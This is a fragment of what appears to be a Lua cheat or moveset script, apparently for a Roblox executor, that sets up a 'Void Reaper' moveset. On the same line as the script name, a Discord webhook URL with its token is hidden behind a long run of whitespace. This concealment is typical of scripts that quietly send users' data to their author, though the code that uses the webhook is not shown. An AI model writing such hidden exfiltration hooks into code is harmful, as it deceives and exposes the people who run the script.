...
local ScriptName = "Friedpotato Void Reaper";                                                                                                                                                                                                                                                                                                                                                                        Webhook = "https://discord.com/api/webhooks/1539679643077185607/hh-kozkxYBg0EZqAD1rUi8WPXyAtwLKm0fRKkm3zGLDx5l5uqAORPpweR5ePZHgwdJHa";
...
local Main = api:CreateMoveset("Void Reaper")
